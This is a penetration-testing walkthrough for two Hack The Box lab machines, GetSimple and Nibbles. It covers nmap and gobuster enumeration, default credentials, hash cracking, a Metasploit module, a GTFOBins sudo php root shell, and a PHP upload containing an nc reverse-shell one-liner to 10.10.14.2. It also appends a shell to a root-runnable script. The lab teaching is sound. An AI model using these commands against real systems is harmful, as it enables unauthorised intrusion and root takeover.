# Basic Enumeration, Footprinting, Foothold, and Privilege Escalation

## Video Guide Here: https://www.youtube.com/watch?v=4kXbV7DvVp8

## Overview

In this guide, we will walk through the four steps of a full cycle penetration test: enumeration, web footprinting, initial access, and privilege escalation. We'll start with a Metasploit module, and then move onto a manual example. These are both streamlined examples to show the process, and are not full scale, enterprise level penetration tests.

## Enumeration

### Utilize `nmap`

First, we'll run `nmap` to identify open ports on the target IP.

```
nmap -sC -sV -oA YT_demo <target_IP_address>

```

The `-sC` flag runs a script scan using the default set of scripts, and `-sV` probes open ports to determine service/version info. `-oA` outputs results in the three major formats at once.

After running `nmap`, we found that ports 22 and 80 are open. Port 80 makes sense since we're targeting a website.

### Utilize `gobuster`

Next, we'll use `gobuster`, a directory/file & DNS busting tool written in Go, to expose more information.

```
gobuster dir -u http://<target_IP_address> -w /usr/share/wordlists/dirb/common.txt

```

## Web Footprinting

Explore the website to find anything useful. Check the `robots.txt` file and navigate to the directories it disallows.

## Initial Access

### Default Admin Credentials

You may find a forum post stating that the default admin credentials for the GetSimple CMS are `admin` and `admin`. You can log in with these credentials.

### Expose Password Hash

In the exposed directory, we can see a `users` section. Within `users`, there's an `admin.xml` file, which contains a hashed password. You can use an online service like `crackstation` to crack the hash.

### Exposed API Key

Another potential vulnerability is an exposed API key.

## Privilege Escalation

### Metasploit

We'll use Metasploit to gain initial access.

```
msfconsole
search getsimple
use 0
set RHOSTS <target_IP_address>
set LHOST <your_IP_address>
run

```

Once you've gained access, you can navigate to the `mrb3n` directory and view the `user.txt` file for the first flag.

### `sudo -l` and GTFOBins

Run `sudo -l` to check your permissions. It may show that you can run PHP files as root with no password.

In this case, we can use GTFOBins, which is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

```
sudo php -r "system('/bin/sh -i');"

```

After running this command, you should have escalated your privileges to root. Navigate to the `root` directory and view the `root.txt` file for the final flag.

# Pentest Guide Pt2: Initial Foothold, and Privilege Escalation

In this guide, we will continue our penetration testing exploration by focusing on manual enumeration, obtaining an initial foothold, and finally escalating privileges. We are using the Nibbles box from Hack The Box.

## Initial Foothold

The enumeration portion has been skipped for this box as the initial foothold isn't conducive to a learning environment. It requires guessing a password, which isn't informative for this tutorial.

Instead, we will focus on uploading a PHP shell and getting remote code execution. After gaining admin access, navigate to the plugin section and notice a "my image" section, which indicates potential for file upload.

```php
<!-- PHP file for remote code execution -->
<?php system('id'); ?>

<!-- PHP file for establishing shell -->
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>

```

Upload the above PHP file and save. Now, navigate to the plugins folder in the content directory and open the `image.php` file to confirm code execution.

## Uploading a Reverse Shell

Next, upload our reverse shell. This shell is designed to listen back to our machine on Port `9443`.

```bash
netcat -lvnp 9443

```

Now, upload the reverse shell and open it to establish a reverse connection.

## Upgrading the TTY

We need to upgrade our TTY to interact with the system effectively.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

After upgrading the TTY, navigate to the home directory and list all the files. You will find `user.txt` which is our first flag.

## Privilege Escalation

The next step involves escalating our privileges. In the absence of additional information, look for potential avenues of access. For instance, `personal.zip` is a file that might contain useful information. Unzip it and inspect the contents.

```bash
unzip personal.zip
cat monitor.sh

```

Here, `monitor.sh` seems to be a system resources checker, monitoring RAM, file usage, and uptime.

We want to bring `linenum` onto this machine for further enumeration.

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
sudo python3 -m http.server 8080

```

Start a python server on your machine, then perform a `wget` back to your machine to pull `linenum`.

```bash
wget [your machine's IP]:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

```

After running `linenum`, we find that we can run `monitor.sh` as root without supplying a password. Consider appending a reverse shell command to the end of `monitor.sh`.

```bash
sudo monitor.sh

```

Upon executing `monitor.sh`, you should get a connection back as root. Now, navigate to the root directory and you will find `root.txt`, which is our second flag.
